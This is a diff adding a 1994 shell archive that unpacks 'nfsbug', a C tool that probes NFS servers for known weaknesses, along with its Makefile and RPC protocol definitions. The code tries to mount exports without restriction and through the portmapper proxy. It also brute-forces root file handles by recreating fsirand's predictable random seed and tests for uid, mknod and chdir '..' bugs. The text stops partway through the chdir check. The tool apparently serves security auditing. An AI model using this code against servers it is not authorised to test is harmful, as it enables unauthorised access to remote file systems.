@@ -1,0 +1,1376 @@
+: This is a shar archive.  Extract with sh, not csh.
+: This archive ends with exit, so do not worry about trailing junk.
+: --------------------------- cut here --------------------------
+PATH=/bin:/usr/bin:/usr/ucb
+echo Extracting 'Makefile'
+sed 's/^X//' > 'Makefile' << '+ END-OF-FILE ''Makefile'
+XCC=cc
+X#CFLAGS=-g -I. -DSVR4
+X#LIBS=-lsocket -lnsl -L/usr/ucblib -lucb -lresolv
+XCFLAGS=-ggdb -I.
+XLIBS=
+XNFSBUG_SOURCES=mount_clnt.c mount_xdr.c nfs_prot_clnt.c nfs_prot_xdr.c nfsbug.c
+XNFSBUG_OBJECTS=mount_clnt.o mount_xdr.o nfs_prot_clnt.o nfs_prot_xdr.o nfsbug.o
+XRPCGEN_MOUNT= mount.h mount_clnt.c mount_svc.c mount_xdr.c
+XRPCGEN_NFS_PROT= nfs_prot.h nfs_prot_clnt.c nfs_prot_svc.c nfs_prot_xdr.c
+X
+Xnfsbug:	$(NFSBUG_OBJECTS)
+X	$(CC) -g -o nfsbug $(NFSBUG_OBJECTS) $(LIBS)
+X
+Xlint:	$(NFSBUG_SOURCES)
+X	lint $(NFSBUG_SOURCES)
+X
+Xclean:
+X	rm -f nfsbug $(NFSBUG_OBJECTS) $(RPCGEN_MOUNT) $(RPCGEN_NFS_PROT) core
+X
+X$(RPCGEN_MOUNT):; rpcgen mount.x
+X$(RPCGEN_NFS_PROT):; rpcgen nfs_prot.x
++ END-OF-FILE Makefile
+chmod 'u=rw,g=r,o=r' 'Makefile'
+set `wc -c 'Makefile'`
+count=$1
+case $count in
+669)	:;;
+*)	echo 'Bad character count in ''Makefile' >&2
+		echo 'Count should be 669' >&2
+esac
+echo Extracting 'mount.x'
+sed 's/^X//' > 'mount.x' << '+ END-OF-FILE ''mount.x'
+X/* @(#)mount.x	1.1 17 Aug 1993 */
+X/* @(#)mount.x 1.5 88/04/21 Copyr 1987 Sun Micro */
+X
+X/*
+X * Protocol description for the mount program
+X */
+X
+X
+Xconst MNTPATHLEN = 1024;	/* maximum bytes in a pathname argument */
+Xconst MNTNAMLEN = 255;		/* maximum bytes in a name argument */
+Xconst FHSIZE = 32;		/* size in bytes of a file handle */
+X
+X/*
+X * The fhandle is the file handle that the server passes to the client.
+X * All file operations are done using the file handles to refer to a file
+X * or a directory. The file handle can contain whatever information the
+X * server needs to distinguish an individual file.
+X */
+Xtypedef opaque fhandle[FHSIZE];	
+X
+X/*
+X * If a status of zero is returned, the call completed successfully, and 
+X * a file handle for the directory follows. A non-zero status indicates
+X * some sort of error. The status corresponds with UNIX error numbers.
+X */
+Xunion fhstatus switch (unsigned fhs_status) {
+Xcase 0:
+X	fhandle fhs_fhandle;
+Xdefault:
+X	void;
+X};
+X
+X/*
+X * The type dirpath is the pathname of a directory
+X */
+Xtypedef string dirpath<MNTPATHLEN>;
+X
+X/*
+X * The type name is used for arbitrary names (hostnames, groupnames)
+X */
+Xtypedef string name<MNTNAMLEN>;
+X
+X/*
+X * A list of who has what mounted
+X */
+Xtypedef struct mountbody *mountlist;
+Xstruct mountbody {
+X	name ml_hostname;
+X	dirpath ml_directory;
+X	mountlist ml_next;
+X};
+X
+X/*
+X * A list of netgroups
+X */
+Xtypedef struct groupnode *groups;
+Xstruct groupnode {
+X	name gr_name;
+X	groups gr_next;
+X};
+X
+X/*
+X * A list of what is exported and to whom
+X */
+Xtypedef struct exportnode *exports;
+Xstruct exportnode {
+X	dirpath ex_dir;
+X	groups ex_groups;
+X	exports ex_next;
+X};
+X
+Xprogram MOUNTPROG {
+X	/*
+X	 * Version one of the mount protocol communicates with version two
+X	 * of the NFS protocol. The only connecting point is the fhandle 
+X	 * structure, which is the same for both protocols.
+X	 */
+X	version MOUNTVERS {
+X		/*
+X		 * Does no work. It is made available in all RPC services
+X		 * to allow server reponse testing and timing
+X		 */
+X		void
+X		MOUNTPROC_NULL(void) = 0;
+X
+X		/*	
+X		 * If fhs_status is 0, then fhs_fhandle contains the
+X	 	 * file handle for the directory. This file handle may
+X		 * be used in the NFS protocol. This procedure also adds
+X		 * a new entry to the mount list for this client mounting
+X		 * the directory.
+X		 * Unix authentication required.
+X		 */
+X		fhstatus 
+X		MOUNTPROC_MNT(dirpath) = 1;
+X
+X		/*
+X		 * Returns the list of remotely mounted filesystems. The 
+X		 * mountlist contains one entry for each hostname and 
+X		 * directory pair.
+X		 */
+X		mountlist
+X		MOUNTPROC_DUMP(void) = 2;
+X
+X		/*
+X		 * Removes the mount list entry for the directory
+X		 * Unix authentication required.
+X		 */
+X		void
+X		MOUNTPROC_UMNT(dirpath) = 3;
+X
+X		/*
+X		 * Removes all of the mount list entries for this client
+X		 * Unix authentication required.
+X		 */
+X		void
+X		MOUNTPROC_UMNTALL(void) = 4;
+X
+X		/*
+X		 * Returns a list of all the exported filesystems, and which
+X		 * machines are allowed to import it.
+X		 */
+X		exports
+X		MOUNTPROC_EXPORT(void)  = 5;
+X	
+X		/*
+X		 * Identical to MOUNTPROC_EXPORT above
+X		 */
+X		exports
+X		MOUNTPROC_EXPORTALL(void) = 6;
+X	} = 1;
+X} = 100005;
++ END-OF-FILE mount.x
+chmod 'u=r,g=r,o=r' 'mount.x'
+set `wc -c 'mount.x'`
+count=$1
+case $count in
+3088)	:;;
+*)	echo 'Bad character count in ''mount.x' >&2
+		echo 'Count should be 3088' >&2
+esac
+echo Extracting 'nfs_prot.x'
+sed 's/^X//' > 'nfs_prot.x' << '+ END-OF-FILE ''nfs_prot.x'
+X/* @(#)nfs_prot.x	1.1 17 Aug 1993 */
+X/*
+X * nfs_prot.x 1.3 88/02/08
+X * Copyright 1987 Sun Microsystems, Inc.
+X */
+Xconst NFS_PORT          = 2049;
+Xconst NFS_MAXDATA       = 8192;
+Xconst NFS_MAXPATHLEN    = 1024;
+Xconst NFS_MAXNAMLEN	= 255;
+Xconst NFS_FHSIZE	= 32;
+Xconst NFS_COOKIESIZE	= 4;
+Xconst NFS_FIFO_DEV	= -1;	/* size kludge for named pipes */
+X
+X/*
+X * File types
+X */
+Xconst NFSMODE_FMT  = 0170000;	/* type of file */
+Xconst NFSMODE_DIR  = 0040000;	/* directory */
+Xconst NFSMODE_CHR  = 0020000;	/* character special */
+Xconst NFSMODE_BLK  = 0060000;	/* block special */
+Xconst NFSMODE_REG  = 0100000;	/* regular */
+Xconst NFSMODE_LNK  = 0120000;	/* symbolic link */
+Xconst NFSMODE_SOCK = 0140000;	/* socket */
+Xconst NFSMODE_FIFO = 0010000;	/* fifo */
+X
+X/*
+X * Error status
+X */
+Xenum nfsstat {
+X	NFS_OK= 0,		/* no error */
+X	NFSERR_PERM=1,		/* Not owner */
+X	NFSERR_NOENT=2,		/* No such file or directory */
+X	NFSERR_IO=5,		/* I/O error */
+X	NFSERR_NXIO=6,		/* No such device or address */
+X	NFSERR_ACCES=13,	/* Permission denied */
+X	NFSERR_EXIST=17,	/* File exists */
+X	NFSERR_NODEV=19,	/* No such device */
+X	NFSERR_NOTDIR=20,	/* Not a directory*/
+X	NFSERR_ISDIR=21,	/* Is a directory */
+X	NFSERR_FBIG=27,		/* File too large */
+X	NFSERR_NOSPC=28,	/* No space left on device */
+X	NFSERR_ROFS=30,		/* Read-only file system */
+X	NFSERR_NAMETOOLONG=63,	/* File name too long */
+X	NFSERR_NOTEMPTY=66,	/* Directory not empty */
+X	NFSERR_DQUOT=69,	/* Disc quota exceeded */
+X	NFSERR_STALE=70,	/* Stale NFS file handle */
+X	NFSERR_WFLUSH=99	/* write cache flushed */
+X};
+X
+X/*
+X * File types
+X */
+Xenum ftype {
+X	NFNON = 0,	/* non-file */
+X	NFREG = 1,	/* regular file */
+X	NFDIR = 2,	/* directory */
+X	NFBLK = 3,	/* block special */
+X	NFCHR = 4,	/* character special */
+X	NFLNK = 5,	/* symbolic link */
+X	NFSOCK = 6,	/* unix domain sockets */
+X	NFBAD = 7,	/* unused */
+X	NFFIFO = 8 	/* named pipe */
+X};
+X
+X/*
+X * File access handle
+X */
+Xstruct nfs_fh {
+X	opaque data[NFS_FHSIZE];
+X};
+X
+X/* 
+X * Timeval
+X */
+Xstruct nfstime {
+X	unsigned seconds;
+X	unsigned useconds;
+X};
+X
+X
+X/*
+X * File attributes
+X */
+Xstruct fattr {
+X	ftype type;		/* file type */
+X	unsigned mode;		/* protection mode bits */
+X	unsigned nlink;		/* # hard links */
+X	unsigned uid;		/* owner user id */
+X	unsigned gid;		/* owner group id */
+X	unsigned size;		/* file size in bytes */
+X	unsigned blocksize;	/* prefered block size */
+X	unsigned rdev;		/* special device # */
+X	unsigned blocks;	/* Kb of disk used by file */
+X	unsigned fsid;		/* device # */
+X	unsigned fileid;	/* inode # */
+X	nfstime	atime;		/* time of last access */
+X	nfstime	mtime;		/* time of last modification */
+X	nfstime	ctime;		/* time of last change */
+X};
+X
+X/*
+X * File attributes which can be set
+X */
+Xstruct sattr {
+X	unsigned mode;	/* protection mode bits */
+X	unsigned uid;	/* owner user id */
+X	unsigned gid;	/* owner group id */
+X	unsigned size;	/* file size in bytes */
+X	nfstime	atime;	/* time of last access */
+X	nfstime	mtime;	/* time of last modification */
+X};
+X
+X
+Xtypedef string filename<NFS_MAXNAMLEN>; 
+Xtypedef string nfspath<NFS_MAXPATHLEN>;
+X
+X/*
+X * Reply status with file attributes
+X */
+Xunion attrstat switch (nfsstat status) {
+Xcase NFS_OK:
+X	fattr attributes;
+Xdefault:
+X	void;
+X};
+X
+Xstruct sattrargs {
+X	nfs_fh file;
+X	sattr attributes;
+X};
+X
+X/*
+X * Arguments for directory operations
+X */
+Xstruct diropargs {
+X	nfs_fh	dir;	/* directory file handle */
+X	filename name;		/* name (up to NFS_MAXNAMLEN bytes) */
+X};
+X
+Xstruct diropokres {
+X	nfs_fh file;
+X	fattr attributes;
+X};
+X
+X/*
+X * Results from directory operation
+X */
+Xunion diropres switch (nfsstat status) {
+Xcase NFS_OK:
+X	diropokres diropres;
+Xdefault:
+X	void;
+X};
+X
+Xunion readlinkres switch (nfsstat status) {
+Xcase NFS_OK:
+X	nfspath data;
+Xdefault:
+X	void;
+X};
+X
+X/*
+X * Arguments to remote read
+X */
+Xstruct readargs {
+X	nfs_fh file;		/* handle for file */
+X	unsigned offset;	/* byte offset in file */
+X	unsigned count;		/* immediate read count */
+X	unsigned totalcount;	/* total read count (from this offset)*/
+X};
+X
+X/*
+X * Status OK portion of remote read reply
+X */
+Xstruct readokres {
+X	fattr	attributes;	/* attributes, need for pagin*/
+X	opaque data<NFS_MAXDATA>;
+X};
+X
+Xunion readres switch (nfsstat status) {
+Xcase NFS_OK:
+X	readokres reply;
+Xdefault:
+X	void;
+X};
+X
+X/*
+X * Arguments to remote write 
+X */
+Xstruct writeargs {
+X	nfs_fh	file;		/* handle for file */
+X	unsigned beginoffset;	/* beginning byte offset in file */
+X	unsigned offset;	/* current byte offset in file */
+X	unsigned totalcount;	/* total write count (to this offset)*/
+X	opaque data<NFS_MAXDATA>;
+X};
+X
+Xstruct createargs {
+X	diropargs where;
+X	sattr attributes;
+X};
+X
+Xstruct renameargs {
+X	diropargs from;
+X	diropargs to;
+X};
+X
+Xstruct linkargs {
+X	nfs_fh from;
+X	diropargs to;
+X};
+X
+Xstruct symlinkargs {
+X	diropargs from;
+X	nfspath to;
+X	sattr attributes;
+X};
+X
+X
+Xtypedef opaque nfscookie[NFS_COOKIESIZE];
+X
+X/*
+X * Arguments to readdir
+X */
+Xstruct readdirargs {
+X	nfs_fh dir;		/* directory handle */
+X	nfscookie cookie;
+X	unsigned count;		/* number of directory bytes to read */
+X};
+X
+Xstruct entry {
+X	unsigned fileid;
+X	filename name;
+X	nfscookie cookie;
+X	entry *nextentry;
+X};
+X
+Xstruct dirlist {
+X	entry *entries;
+X	bool eof;
+X};
+X
+Xunion readdirres switch (nfsstat status) {
+Xcase NFS_OK:
+X	dirlist reply;
+Xdefault:
+X	void;
+X};
+X
+Xstruct statfsokres {
+X	unsigned tsize;	/* preferred transfer size in bytes */
+X	unsigned bsize;	/* fundamental file system block size */
+X	unsigned blocks;	/* total blocks in file system */
+X	unsigned bfree;	/* free blocks in fs */
+X	unsigned bavail;	/* free blocks avail to non-superuser */
+X};
+X
+Xunion statfsres switch (nfsstat status) {
+Xcase NFS_OK:
+X	statfsokres reply;
+Xdefault:
+X	void;
+X};
+X
+X/*
+X * Remote file service routines
+X */
+Xprogram NFS_PROGRAM {
+X	version NFS_VERSION {
+X		void 
+X		NFSPROC_NULL(void) = 0;
+X
+X		attrstat 
+X		NFSPROC_GETATTR(nfs_fh) =	1;
+X
+X		attrstat 
+X		NFSPROC_SETATTR(sattrargs) = 2;
+X
+X		void 
+X		NFSPROC_ROOT(void) = 3;
+X
+X		diropres 
+X		NFSPROC_LOOKUP(diropargs) = 4;
+X
+X		readlinkres 
+X		NFSPROC_READLINK(nfs_fh) = 5;
+X
+X		readres 
+X		NFSPROC_READ(readargs) = 6;
+X
+X		void 
+X		NFSPROC_WRITECACHE(void) = 7;
+X
+X		attrstat
+X		NFSPROC_WRITE(writeargs) = 8;
+X
+X		diropres
+X		NFSPROC_CREATE(createargs) = 9;
+X
+X		nfsstat
+X		NFSPROC_REMOVE(diropargs) = 10;
+X
+X		nfsstat
+X		NFSPROC_RENAME(renameargs) = 11;
+X
+X		nfsstat
+X		NFSPROC_LINK(linkargs) = 12;
+X
+X		nfsstat
+X		NFSPROC_SYMLINK(symlinkargs) = 13;
+X
+X		diropres
+X		NFSPROC_MKDIR(createargs) = 14;
+X
+X		nfsstat
+X		NFSPROC_RMDIR(diropargs) = 15;
+X
+X		readdirres
+X		NFSPROC_READDIR(readdirargs) = 16;
+X
+X		statfsres
+X		NFSPROC_STATFS(nfs_fh) = 17;
+X	} = 2;
+X} = 100003;
+X
++ END-OF-FILE nfs_prot.x
+chmod 'u=r,g=r,o=r' 'nfs_prot.x'
+set `wc -c 'nfs_prot.x'`
+count=$1
+case $count in
+6405)	:;;
+*)	echo 'Bad character count in ''nfs_prot.x' >&2
+		echo 'Count should be 6405' >&2
+esac
+echo Extracting 'nfsbug.c'
+sed 's/^X//' > 'nfsbug.c' << '+ END-OF-FILE ''nfsbug.c'
+X/*
+X * nfsbug.c
+X *
+X * Test hosts for well known NFS problems/bugs. Among these tests are:
+X * find world wide exportable file systems, determine whether the
+X * export list really works, determine whether we can mount file systems
+X * through the portmapper, try to guess file handles, excercise the
+X * mknod bug, and the uid masking bug.
+X *
+X * Author:
+X *	Leendert van Doorn, april 1994
+X *
+X * TODO:
+X *	- close sockets (?)
+X */
+X#include <stdio.h>
+X#include <ctype.h>
+X#include <netdb.h>
+X#include <errno.h>
+X#include <rpc/rpc.h>
+X#ifdef SVR4
+X#include <rpc/clnt_soc.h>
+X#endif
+X#include <sys/param.h>
+X#include <sys/socket.h>
+X#include <netinet/in.h>
+X#include <arpa/inet.h>
+X#include <sys/sysmacros.h>
+X#include <sys/time.h>
+X#include <sys/vnode.h>
+X#include <sys/vfs.h>
+X#include <sys/sysmacros.h>
+X#ifdef SVR4
+X#include <sys/inode.h>
+X#else
+X#ifndef HPUX
+X#include <ufs/inode.h>
+X#endif
+X#endif
+X
+X#include "mount.h"
+X#include "nfs_prot.h"
+X
+X#ifndef TRUE
+X#define	TRUE	1
+X#define	FALSE	0
+X#endif
+X
+X#ifdef SVR4
+X#define bzero(s,n)      memset((s), 0, (n))
+X#define bcopy(a,b,c)    memcpy(b,a,c)
+X#endif
+X
+X/*
+X * Something that is unlikely to appear in the
+X * remote NFS server's name space.
+X */
+X#define	VERY_UNLIKELY_FILE_NAME	"vUnLKeYFn"
+X
+X/*
+X * This random seed is the constant value that the
+X * uninitialized variable ``timeval'' in fsirand contains.
+X */
+X#define SUN4_RANDOM	(0 + 32)
+X
+X/*
+X * Disk device descriptor (major/minor)
+X */
+X#define NMINORS		16
+Xstruct disk {
+X    int dsk_maj;		/* major disk device number */
+X    int dsk_min[NMINORS];	/* minor device table */
+X};
+X
+X/*
+X * Device descriptor
+X */
+X#define NDISKS		4
+Xstruct device {
+X    long dev_random;		/* machine specific random seed */
+X    int dev_pid;		/* maximum pid to look at */
+X    struct disk dev_disks[NDISKS]; /* disk table */
+X};
+X
+X/*
+X * The device table
+X */
+X#define	NDEVICES	(sizeof(device)/sizeof(struct device))
+Xstruct device device[] = {
+X    { SUN4_RANDOM, 2000,
+X	{
+X	    { 10,   /* /dev/xd[01][a-h] */
+X		{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 } },
+X	    { 7,    /* /dev/sd[01][a-h] */
+X		{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 } },
+X	    { 22,   /* /dev/id00[01][a-h] */
+X		{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 } },
+X	    { 3,    /* /dev/xy[01][a-h] */
+X		{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 } },
+X	}
+X    },
+X    { 0 }
+X};
+X
+X/*
+X * File system types, these correspond to entries in fsconf
+X */
+X#define MOUNT_UFS       1
+X#define MOUNT_NFS       2
+X#define MOUNT_PC        3
+X#define MOUNT_LO        4
+X#define MOUNT_TFS       5
+X#define MOUNT_TMP       6
+X
+X/*
+X * This struct is only used to find the size of the data field in the
+X * fhandle structure below.
+X */
+Xstruct fhsize {
+X    fsid_t  f1;
+X    u_short f2;
+X    char    f3[4];
+X    u_short f4;
+X    char    f5[4];
+X};
+X#define NFS_FHMAXDATA   ((NFS_FHSIZE - sizeof (struct fhsize) + 8) / 2)
+X
+Xstruct svcfh {
+X    fsid_t  fh_fsid;                /* filesystem id */
+X    u_short fh_len;                 /* file number length */
+X    char    fh_data[NFS_FHMAXDATA]; /* and data */
+X    u_short fh_xlen;                /* export file number length */
+X    char    fh_xdata[NFS_FHMAXDATA]; /* and data */
+X};
+X
+Xchar *program;
+Xint verbose = 0;
+Xint mountcheck = TRUE;			/* simple export checks */
+Xint portmapcheck = TRUE;		/* portmapper mount checks */
+Xint handlecheck = TRUE;			/* handle guessing */
+Xstruct timeval timeout = { 30, 0 }; 	/* default time-out value */
+X
+Xvoid usage();
+Xvoid nfsbug();
+XAUTH *create_unix_auth();
+Xfhstatus *pmap_mnt();
+Xchar *nfs_error();
+Xvoid makehandle(), printhandle();
+X
+Xmain(argc, argv)
+X    int argc;
+X    char **argv;
+X{
+X    int i, opt;
+X    extern int optind;
+X
+X    program = argv[0];
+X    while ((opt = getopt(argc, argv, "mphv")) != EOF) {
+X	switch (opt) {
+X	case 'm':
+X	    mountcheck = !mountcheck;
+X	    break;
+X	case 'p':
+X	    portmapcheck = !portmapcheck;
+X	    break;
+X	case 'h':
+X	    handlecheck = !handlecheck;
+X	    break;
+X	case 'v':
+X	    verbose++;
+X	    break;
+X	default:
+X	    usage();
+X	}
+X    }
+X    if (optind == argc)
+X	usage();
+X
+X    for (i = optind; i < argc; i++)
+X	nfsbug(argv[i]);
+X}
+X
+Xvoid
+Xusage()
+X{
+X    fprintf(stderr, "Usage: %s [-mphv] host ...\n", program);
+X    exit(1);
+X}
+X
+X/*
+X * Detect and report a number of well known NFS bugs
+X */
+Xvoid
+Xnfsbug(host)
+X    char *host;
+X{
+X    struct sockaddr_in server_addr, addr;
+X    CLIENT *mntclient, *nfsclient;
+X    fhstatus *mountpoint;
+X    exports ex, *exp;
+X    attrstat *res;
+X    groups gr;
+X    int sock;
+X    char *proto;
+X
+X    /* hosts can either be symbolic names or real IP addresses */
+X    if (isdigit(*host)) {
+X	server_addr.sin_addr.s_addr = inet_addr(host);
+X    } else {
+X	struct hostent *hp = gethostbyname(host);
+X	if (hp == NULL) {
+X	    fprintf(stderr, "%s: %s: unknown host\n", program, host);
+X	    return;
+X	}
+X	bcopy(hp->h_addr, (char *)&server_addr.sin_addr.s_addr, hp->h_length);
+X	host = hp->h_name;
+X    }
+X    server_addr.sin_family = AF_INET;
+X    server_addr.sin_port = 0;
+X
+X    /*
+X     * Talk to the remote mount daemon. First try a TCP stream before
+X     * using UDP. TCP deals large packets better than UDP, besides TCP
+X     * performs better over long haul networks :-)
+X     */
+X    sock = RPC_ANYSOCK;
+X    addr = server_addr; /* gets garbaged */
+X    if ((mntclient = clnttcp_create(&addr,
+X      MOUNTPROG, MOUNTVERS, &sock, 0, 0)) == (CLIENT *)0) {
+X	if (sock != RPC_ANYSOCK)
+X	   close(sock);
+X	sock = RPC_ANYSOCK;
+X	addr = server_addr; /* gets garbaged */
+X	if ((mntclient = clntudp_create(&addr,
+X	  MOUNTPROG, MOUNTVERS, timeout, &sock)) == (CLIENT *)0) {
+X	    clnt_pcreateerror("mount");
+X	    return;
+X	}
+X	proto = "UDP/IP";
+X    } else
+X	proto = "TCP/IP";
+X
+X    clnt_control(mntclient, CLSET_TIMEOUT, &timeout);
+X    mntclient->cl_auth = create_unix_auth(0, 0);
+X    if (mntclient->cl_auth == NULL) {
+X	clnt_destroy(mntclient);
+X	return;
+X    }
+X    mntclient->cl_auth = create_unix_auth(-2, -2); /* well known uid, gid */
+X    if (mntclient->cl_auth == NULL) {
+X	clnt_destroy(mntclient);
+X	return;
+X    }
+X    if (verbose)
+X	printf("Connected to NFS mount daemon at %s using %s\n", host, proto);
+X
+X    /*
+X     * Set up a connection with the NFS server. Again, first try TCP
+X     * and then UDP. I must admit, I haven't see that many NFS servers
+X     * that talk TCP.
+X     */
+X    sock = RPC_ANYSOCK;
+X    addr = server_addr; /* gets garbaged */
+X    if ((nfsclient = clnttcp_create(&addr,
+X      NFS_PROGRAM, NFS_VERSION, &sock, 0, 0)) == (CLIENT *)0) {
+X	if (sock != RPC_ANYSOCK)
+X	   close(sock);
+X	sock = RPC_ANYSOCK;
+X	addr = server_addr; /* gets garbaged */
+X	if ((nfsclient = clntudp_create(&addr,
+X	  NFS_PROGRAM, NFS_VERSION, timeout, &sock)) == (CLIENT *)0) {
+X	    clnt_pcreateerror("nfs clntudp_create");
+X	    clnt_destroy(mntclient);
+X	    return;
+X	}
+X	proto = "UDP/IP";
+X    } else
+X	proto = "TCP/IP";
+X
+X    clnt_control(nfsclient, CLSET_TIMEOUT, &timeout);
+X    nfsclient->cl_auth = create_unix_auth(-2, -2); /* well known uid, gid */
+X    if (nfsclient->cl_auth == NULL) {
+X	clnt_destroy(nfsclient);
+X	clnt_destroy(mntclient);
+X	return;
+X    }
+X    if (verbose)
+X	printf("Connected to NFS server at %s using %s\n", host, proto);
+X
+X    /*
+X     * Get the NFS export list. From this we extract the file systems
+X     * we try to mount.
+X     */
+X    if ((exp = mountproc_export_1(NULL, mntclient)) == NULL) {
+X	clnt_perror(mntclient, "mountproc_export");
+X	clnt_destroy(mntclient);
+X	return;
+X    }
+X    if (verbose > 2) {
+X	for (ex = *exp; ex != NULL; ex = ex->ex_next) {
+X	    printf("%-25s", ex->ex_dir);
+X	    if ((int)strlen(ex->ex_dir) >= 25)
+X		printf("\n                    ");
+X	    if ((gr = ex->ex_groups) == NULL)
+X		printf("everyone");
+X	    while (gr) {
+X		printf("%s ", gr->gr_name);
+X		gr = gr->gr_next;
+X	    }
+X	    putchar('\n');
+X	}
+X    }
+X
+X    /*
+X     * 1. A number of problems exist here: Either the SA is terribly sloppy
+X     *    and didn't care to set the export list for a file system, the
+X     *    remote mount daemon has the old 256 bytes bug, or we're simply
+X     *    allowed to mount this file system. In either case we just try
+X     *	  to mount them and report whether we succeeded.
+X     */
+X    if (mountcheck) {
+X	for (ex = *exp; ex != NULL; ex = ex->ex_next) {
+X	    if (verbose > 1) printf("Trying %s ...\n", ex->ex_dir);
+X	    mountpoint = mountproc_mnt_1(&ex->ex_dir, mntclient);
+X	    if (mountpoint && mountpoint->fhs_status == NFS_OK) {
+X		res = nfsproc_getattr_2(mountpoint->fhstatus_u.fhs_fhandle,
+X			nfsclient);
+X		if (res && res->status == NFS_OK) {
+X		    printf("MOUNTABLE FILE SYSTEM %s:%s ", host, ex->ex_dir);
+X		    if (ex->ex_groups == NULL)
+X			printf("(no export restrictions)");
+X		    /* XXX find out whether we're in the export list */
+X		    putchar('\n');
+X		    exercise(mountpoint->fhstatus_u.fhs_fhandle, nfsclient,
+X			host, ex->ex_dir);
+X		} else if (verbose && res) {
+X		    printf("Handle for %s failed: %\n",
+X			ex->ex_dir, nfs_error(res->status));
+X		}
+X		mountproc_umnt_1(&ex->ex_dir, mntclient);
+X	    } else if (verbose && mountpoint)
+X		printf("Failed: %s: %s\n",
+X		    ex->ex_dir, nfs_error(mountpoint->fhs_status));
+X	}
+X    }
+X
+X    /*
+X     * 2. Try to mount the file systems using the proxy RPC functionality
+X     *    provided by the portmapper. This problem occurs when the export
+X     *    list is reflexive, i.e. the host is contained in it.
+X     */
+X    if (portmapcheck) {
+X	for (ex = *exp; ex != NULL; ex = ex->ex_next) {
+X	    mountpoint = pmap_mnt(&ex->ex_dir, &server_addr);
+X	    if (mountpoint && mountpoint->fhs_status == NFS_OK) {
+X		res = nfsproc_getattr_2(mountpoint->fhstatus_u.fhs_fhandle,
+X			nfsclient);
+X		if (res && res->status == NFS_OK) {
+X		    printf("MOUNTABLE FILE SYSTEM %s:%s (via portmapper)\n",
+X			host, ex->ex_dir);
+X		    exercise(mountpoint->fhstatus_u.fhs_fhandle, nfsclient,
+X			host, ex->ex_dir);
+X		    /* no unmount */
+X		} else if (verbose && res) {
+X		    printf("Failed: %s: %s\n",
+X			ex->ex_dir, nfs_error(mountpoint->fhs_status));
+X		}
+X	    }
+X	}
+X    }
+X
+X    /*
+X     * 3. Try to obtain remote file handles by guessing them. By far the
+X     *    most elaborate attack among this set, all though probably the
+X     *    less succesful. Because of a initialization problem in fsirand
+X     *    the inode generation number (the only real variable part in a
+X     *    file handle) gets initialized with a number between 0 and 30000,
+X     *    but in practice this is a number between 100..2000.
+X     *
+X     *    The machine/device major/device minor table is a three dimensional
+X     *	  matrix which we traverse. So far I haven't sorted out all the
+X     *	  proper values for different kind of machinery, only those which
+X     *	  we have around.
+X     */
+X    if (handlecheck) {
+X	register struct device *devp;
+X	register int frpid;
+X	register int dsk;
+X	register struct disk *dp;
+X	register int min, maj;
+X	fhandle handle;
+X	long gen;
+X	int n;
+X
+X	for (devp = device; devp < &device[NDEVICES]; devp++) {
+X	    for (frpid = 0; frpid <= devp->dev_pid; frpid++) {
+X		/*
+X		 * We are looking for the generation number of i-node 2,
+X		 * the root i-node of a file system. This one is the easiest
+X		 * because it is the only special case in which the same i-node
+X		 * appears twice in the same handle (as root fs i-node and
+X		 * target i-node).
+X		 *
+X		 * The following magic is required to get the random generator
+X		 * machinery in the same state as the fsirand program might
+X		 * have been (given that it had pid at the time it ran).
+X		 */
+X#ifdef	HPUX
+X		srand(1);
+X		srand(frpid + devp->dev_random);
+X		for (n = frpid; n--; ) (void) rand();
+X		(void) rand(); /* inode 0 */
+X		(void) rand(); /* inode 1 */
+X		gen = rand();
+X#else
+X		srandom(1);
+X		srandom(frpid + devp->dev_random);
+X		for (n = frpid; n--; ) (void) random();
+X		(void) random(); /* inode 0 */
+X		(void) random(); /* inode 1 */
+X		gen = random();
+X#endif
+X
+X		if (verbose && (frpid % 10) == 0)
+X		    printf("\tfsirand pid = %d, gen = %ld\n", frpid, gen);
+X
+X		for (dsk = 0; dsk < NDISKS; dsk++) {
+X		    dp = &devp->dev_disks[dsk];
+X		    maj = dp->dsk_maj;
+X		    for (min = 0; min < NMINORS; min++) {
+X			makehandle(handle,
+X			    maj, dp->dsk_min[min], 2, gen, 2, gen);
+X			res = nfsproc_getattr_2(handle, nfsclient);
+X			if (res && res->status == NFS_OK) {
+X			    printf("GUESSABLE FILE HANDLE %s: ", host);
+X			    printhandle(handle);
+X			    printf("\n");
+X			    exercise(handle, nfsclient, host, "<unknown>");
+X			    break; /* got it for this minor device */
+X			}
+X		    }
+X		}
+X	    }
+X	}
+X    }
+X
+X    auth_destroy(nfsclient->cl_auth);
+X    clnt_destroy(nfsclient);
+X    auth_destroy(mntclient->cl_auth);
+X    clnt_destroy(mntclient);
+X}
+X
+X/*
+X * Exercise the system for ``well known'' bugs
+X */
+Xexercise(handle, client, host, dir)
+X    fhandle *handle;
+X    CLIENT *client;
+X    char *host, *dir;
+X{
+X    /*
+X     * Of course when the uid bug works there's not much point
+X     * in testing the mknod bug as well.
+X     */
+X    if (uidbug(handle, client))
+X	printf("UID .. BUG: %s:%s\n", host, dir);
+X    if (mknodbug(handle, client))
+X	printf("MKNOD .. BUG: %s:%s\n", host, dir);
+X    if (cdbug(handle, client))
+X	printf("CHDIR .. BUG: %s:%s\n", host, dir);
+X}
+X
+X/*
+X * 4. The chdir ... bug. The original NFS implementation has the nice feature
+X *    that cd .. on an exported file system (where the exported file is not
+X *    the physical root) gets you the parent directory handle even if it was
+X *    not exported. This is particularry worrisome on diskless clients where
+X *    you have root access to your own NFS mounted root, but also to all the
+X *    other physical directories on top of you (and down from there; e.g. the
+X *    root file systems of other workstations).
+X */
+Xint
+Xcdbug(handle, client)
+X    fhandle *handle;
+X    CLIENT *client;
+X{
+X    struct svcfh *fh = (struct svcfh *) handle;
+X    diropargs dargs;
+X    diropres *dres;
+X    attrstat *ares;
+X
+X    /*
+X     * This only works for non physical UFS roots (i.e. the
+X     * inode number is not 2). I don't know about other file
+X     * systems.
+X     */
+X#ifdef	HPUX
+X    if (fh->fh_fsid[1] != MOUNT_UFS)
+X	return FALSE;
+X#else
+X    if (fh->fh_fsid.val[1] != MOUNT_UFS)
+X	return FALSE;
+X#endif
+X    if (*((ino_t *)&fh->fh_data[2]) != 2)
+X	return FALSE;
+X
+X    /* get the file handle for ``..'' */
+X    dargs.name = "..";
